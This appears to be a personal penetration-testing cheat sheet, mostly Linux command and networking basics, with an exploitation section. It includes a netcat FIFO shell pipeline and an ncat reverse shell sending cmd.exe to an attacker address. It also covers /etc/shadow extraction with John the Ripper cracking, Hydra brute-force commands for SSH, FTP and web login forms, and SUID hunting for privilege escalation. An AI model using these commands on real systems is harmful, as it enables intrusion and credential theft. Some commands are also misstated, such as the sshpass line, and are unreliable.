# pentesting-cheatsheet
## Table of Contents
1. Linux Operating System
* Commandline (CLI)
2. Windows Operating System
3. Network Enumeration
4. Exploitation
  - Burp Suite
  - Hydra
  - Reverse Shell
5. Privilage Escalation

1.  Linux Operating System
- Shortcuts
`CTRL + P`
change the prompt style

- Commands
`file <a-file>`
print the type of the file

`cat -n <a-file>`
print the content of the file with the line numbering

`less -F <a-file>`
print the content of file + waiting for chnages in it to display

`man -k printf`
`man –k ‘^shadow$‘`
Search the short descriptions and manual page names for the keyword printf  as regular expression.  Print out any matches.  Equivalent to apropos printf.

`set`
print the system variables of the system

`echo $HISTFILE`
print the value of the system variable that stores the shell history

`history or cat ~/.zsh_history`
to print the shell history for the current user

`alias ll='ls -la'`
setting an alias to a command
#### Hint to make the alias permenant also after ending the session append `alias ll='ls -la'` to ~/.zshrc. ~/.zshrc contains the commands that are excuted at start of interactive shell.

`cat /etc/issue`
print the version of linux distribution
#### Hint Another useful tool is the command `uname` for identifying the specification of the target linux machine
e.g.:
`uname`, `uname -v`, `uname -a` or `uname -r`

`which sbd`
locate a program that is included to the PATH variable

`locate mimikatz.exe`
locate a file or a folder through the database locate.db instead of searching the local drive

Another way of searching the file system is `find` command that uses recursion to search and have among others these options e.g.:
* -name to search by name (case sensitve)
* -iname to search by name (case insenstive)
* -type f/d/l/s to search by type (files, directories, links, sockets)
* -size to search by size
* -mtime to search by modification date
* -user to search by user
* -perm to search by permissions given

`echo -n "within the same last line" >> text.txt`
append to a file and the -n ensures that we append in the same last line

Within the redirect streams in Linux there is the symbol `<` which used when a file content should be readed in another program input

`grep -r "root" /boot`
search recursively for a regular expression

* `sed` is command that is used to edit streams
  `echo "Ich hasse Linux" | sed 's/hasse/liebe/'`
  -> Ich liebe Linux

`cut` is used to cut some content of a stream. Often it is being used with -f (field) and -d (delimeter)
`echo "Ich mag Hacking, Blumen, Feen, Programmierung und IT-Sicherheit." | cut -f 1,4 -d ','`
-> Ich mag Hacking, Programmierung und IT-Sicherheit

**awk** is a whole programming language for text editing. 2 common options when dealing with it in the shell are -F for definition of fieldseparators and the Subprogram **print** for printing the resulted text
`echo "ist:das:wirklich:so" | awk -F ":" '{print $4, $3, $1, $2}'`
-> so wirklich ist das


..
`sudo usermod -a -G <list_of_groups> <user>`
to add an existing user to an existing group

`id`
print User ID and group IDs
Different options of id:
-g, --group : print only effective group id
-G, --groups : print all group IDs
-r, --real : print only real user id
-u, --user : print only effective user id

..

`nc -nlvp 8080` 
netcat to listen on the port 8080

`nc localhost 8080`
netcat to connect

Because new versions of nc have no -e or -c options, here is a workaround to pass the shell through nc:
On ‘server’ side:

           $ rm -f /tmp/f; mkfifo /tmp/f
           $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

     On ‘client’ side:

           $ nc host.example.com 1234
           $ (shell prompt from host.example.com)
more on that see (https://manpages.ubuntu.com/manpages/bionic/man1/nc_openbsd.1.html)


### Linux Networking & Services
`ifconfig` or `ip addr`
show details of network devices and interfaces

##### Change IP Address in shell:
###### Change to specific IP address
`cat /etc/network/interfaces`
then append the following and substitute the interface details:
allow-hotplug [interface]
  iface [interface] inet static
  address [IP]
  netmask [Netmask]
  gateway [Default_Gateway]

then `sudo ifdown [interface]`
`sudo ifup [interface]`

###### Change to be automatically set by a DHCP Server
change the /etc/network/interfaces configuration File to append:
allow-hotplug [interface]
iface [interface] inet dhcp

--
`hostname`
show hostname (very often also shown after the @ symbol in the prompt)

`netstat -natup`
enumeration to the aktive and non aktive connections on the ports 
-n numeric addresses
-a listening and not listening sockets
-t TCP-Connections
-u UDP-Connections
-p PID und name of the program

`ss -netup`
another utility to investigate sockets

`arp -en`
enumerate the connections on layer 2 of OSI Model(arp cache)

`route`
show IP routing table

* DNS Server (nameserver) is contained in `/etc/resolv.conf`
* fixed entries (without extra DNS Server) are stored in /etc/hosts
* The order of name resolution is in /etc/nsswitch.conf (Name Service Switch)

`host www.megacorpone.com`
show the ip address of a specific domain

`host -t mx www.megacorpone.com` and `host -t txt www.megacorpone.com`
show entries for txt or mx in a specific domain

`nslookup kali.org` and `dig kali.org`
show dns records

`dig -t mx www.megacorpone.com`
show mx entries in the domain

`dig @8.8.8.8 kali.org`
dig command through a specific name domain

* SSH
`sudo systemctl start ssh`
start ssh server

`sudo systemctl status ssh`
check the ssh status

`ssh username@host`
establish a ssh connection

`who`
show currently active users 

`exit`
exit ssh

* configuration of the ssh client : /etc/ssh/ssh_config
* Configuration of the daemon ( server process) of ssh : /etc/ssh/sshd_config

`ssh kali@god -p 999`
run ssh with other port than the standard port 22

* List of the known hosts in the ssh service: ~/.ssh/known_hosts
* ~/.ssh/authorized_keys : The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured.

The Automatic saving of hosts in ~/.ssh/known_hosts is prevented by:
* edit /etc/ssh/ssh_config ??!
* or running ssh with the option : -o stricthostkeychecking=no

`scp username@host:remote-file-path`
secure copy a remote file
**Note** under some circumstances it is necessary to the password of ssh be saved and reused in a script.
with that sshpass can help
`ssh -p "password" ssh kali@localhost`
  
* Netcat
Netcat can redirect the input of STDIN through the network. With this we can send whole files.

Netcat can also redirect the whole output of programms over the network. For that you should compile netcat with the flag  -DGAPING_SECURITY_HOLE set, then nc should be run with the flag -e to redirect STDIN, STDOUT and STDERR.

* Wget
`wget < webseite _url >`
download data from the internet
-O : store output in a specific folder
-o : create log file
--recursive : recursive download of website (!! Warnning)

* Curl
`curl https://www.kali.org`
simple way of manipulating server responses 

When you use curl to download, you must specify output target
`curl < webseite_url > -o doku_kali.org`

`curl https://www.offensive-security.com -I`
output the HTTP Headers of the response -- Should be used if the response is binary data, because when receiving binary data with curl, you should specify a output folder.

* FTP
`ftp 10.11.1.14`
establish a ftp connection

* To send files to the server use put: `put client.txt`
* To receive files from the server use get: `get cmd.asp`
* To change the encoding of the sended data: `bin` or `ascii`

* Firewalls, ACL and iptables

`sudo iptables -L`
list ACL for the netfilter packet-filter-framework

- Filter Tablle
The standard table is in 3 chains: INPUT, OUTPUT and FORWARD data traffic

`sudo iptables -P FORWARD DROP`
change the policy 

For editting the filter table: 
-p the protocol mostly tcp, udp or icmp
-s the source in CIDR Notation
-d destination Address
-i or -o for interfaces for input and output
-A the chain that the command is editting

e.g. `sudo iptables -s 192.168.1.0/24 -p all -A INPUT`

`sudo iptables -L --line-numbers`
list the rules with the respective order

`sudo iptables -D INPUT 1`
delete a rule

`sudo iptables -nvL`
messure traffic


#### Linux Password Cracking
`sudo unshadow /etc/passwd /etc/shadow > hashes.txt`
`john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
that is a one way to crack password with john the ripper with this format

* hash-identifier tool for determining the type of the hash

* [Hash cracker online Tool](https://crackstation.net/)
#### Network Enumeration


##### Banner Grabbing

##### Vulnerability scanning
`nikto -h 192.168.1.1`
vulearability scan to the specified host (-h) 


#### Exploitatiotion
- Ncat
Victim (windows)
`ncat -v 10.11.0.215 444 -e cmd.exe --ssl` 
Attacker (Kali)
`ncat -lvp 444 --allow 10.11.14.53 --ssl`

##### Burp suite
Ctrl + Shift + D	Dashboard
Ctrl + Shift + T	Target tab
Ctrl + Shift + P	Proxy tab
Ctrl + Shift + I	Intruder tab
Ctrl + Shift + R	Repeater tab

##### Hydra
The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being user and a password list being passlist.txt, we’d use the following command:

hydra -l user -P passlist.txt ftp://MACHINE_IP

+ On SSH
  hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

  -l	specifies the (SSH) username for login
  -P	indicates a list of passwords
  -t	sets the number of threads to spawn

+ On Post Web Form
 You must know which type of request it is making; GET or POST methods are commonly used.
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"

Option	Description
-l	the username for (web form) login
-P	the password list to use
http-post-form	the type of the form is POST
<path>	the login page URL, for example, login.php
<login_credentials>	the username and password used to log in, for example, username=^USER^&password=^PASS^
<invalid_response>	part of the response when the login fails
-V	verbose output for every attempt

Below is a more concrete example Hydra command to brute force a POST login form:

hydra -l < username > -P < wordlist > MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

The login page is only /, i.e., the main IP address.
The username is the form field where the username is entered
The specified username(s) will replace ^USER^
The password is the form field where the password is entered
The provided passwords will be replacing ^PASS^
Finally, F=incorrect is a string that appears in the server reply when the login fails


##### Reverse Shell
* Port 53 is rarely blocked on the the firewalls of victim machines. It is perfect for listening in reverse shell.
* [Reverse Shell Generator](https://www.revshells.com/)
#### Privilage Escalation

[GTFOBins](https://gtfobins.github.io/)

##### setuid Privilage Escalation

[SUID, GUID and Sticky Bit](https://linuxhandbook.com/suid-sgid-sticky-bit/)

[Real, Effective and Saved UserID](https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/)

`find / -user root -perm -4000 -print 2>/dev/null`
find all files that have the setuid bit set

`find / -perm +6000 2>/dev/null | grep "/bin"`
grap binaries with set uid or set gid on
